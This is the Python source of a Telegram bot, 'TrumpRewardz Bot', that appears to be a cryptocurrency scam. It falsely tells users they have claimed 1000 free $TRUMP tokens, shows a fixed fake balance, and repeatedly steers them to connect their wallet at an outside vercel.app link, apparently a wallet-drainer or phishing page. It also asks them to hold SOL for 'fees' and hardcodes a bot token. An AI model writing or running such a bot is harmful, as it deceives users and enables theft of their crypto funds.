import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

TOKEN = "8438817273:AAHE5BfxOGIKj82FBmZGBnicMafgPAdyBto"

# Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    message = (
        f"👋 Welcome *{user.first_name}* to TrumpRewardz Bot!\n\n"
        "🎁 Claim your free *1000 $TRUMP token* instantly.\n"
        "💼 Connect your wallet and withdraw with ease.\n\n"
        "👇 Use the buttons below to get started."
    )
    keyboard = [
        [InlineKeyboardButton("🎁 Claim $TRUMP", callback_data='claim')],
        [InlineKeyboardButton("🔗 Connect Wallet", url="https://liberty-capital.vercel.app/")],
        [InlineKeyboardButton("📤 Withdraw", callback_data='withdraw')],
        [InlineKeyboardButton("👤 My Balance", callback_data='balance')],
        [InlineKeyboardButton("🎯 Referral Link", callback_data='referral')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_markdown(message, reply_markup=reply_markup)

# Command Handlers
async def claim(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("✅ You've successfully claimed *1000 $TRUMP*!\nNow /connect your wallet to withdraw.", parse_mode='Markdown')

async def connect(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔗 Click below to connect your wallet:\n👉 https://liberty-capital.vercel.app/")

async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("💸 Withdrawals are automatic once your wallet is connected.\n\n⚠️ Make sure your wallet has at least 0.01 SOL for network fees.")

async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🧾 Your current balance is: *1000 $TRUMP*", parse_mode='Markdown')

async def referral(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    referral_link = f"https://t.me/TrumpRewardz_Bot?start={user_id}"
    await update.message.reply_text(f"👥 Share your referral link:\n{referral_link}")

# Main App
app = ApplicationBuilder().token(TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("claim", claim))
app.add_handler(CommandHandler("connect", connect))
app.add_handler(CommandHandler("withdraw", withdraw))
app.add_handler(CommandHandler("balance", balance))
app.add_handler(CommandHandler("referral", referral))

print("Bot is running...")
app.run_polling()